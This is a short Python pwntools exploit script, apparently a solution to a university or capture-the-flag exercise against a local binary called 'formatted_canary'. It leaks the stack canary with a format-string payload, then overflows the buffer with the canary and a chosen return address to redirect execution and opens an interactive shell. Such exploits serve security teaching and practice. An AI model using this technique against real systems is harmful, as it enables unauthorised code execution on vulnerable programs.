import socket
import struct
import telnetlib
from pwn import *

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('tpas.alunos.dcc.fc.up.pt', 5007))
#s.connect(('127.0.0.1', 2222))

#s = remote("tpas.alunos.dcc.fc.up.pt", 5010)
s = process("./formatted_canary")

s.recvuntil("> ")

s.send('1\n')

s.recvuntil("Name: ")

sploit = "%p%p%p%p%p%p%p%p%p%p%p%p%p\n"
s.send(sploit)
s.recvuntil("> ")

s.send('2\n')

canary = s.recvuntil("> ")[174:192]
print "[+] Got canary " + canary
print canary
canary = int(canary, 16)

pwn = 'A'*40
pwn += struct.pack("<Q", canary)
pwn += struct.pack("<Q", 0x00000000)
pwn += struct.pack("<Q", 0x0040077d)

s.send('1\n')
s.recvuntil("Name: ")

s.send(pwn + '\n')

s.recvuntil("> ")

s.send('3\n')
s.interactive()


#canary = struct.unpack("<Q", canary)[0]
#print "[+] Got canary " + hex(canary)

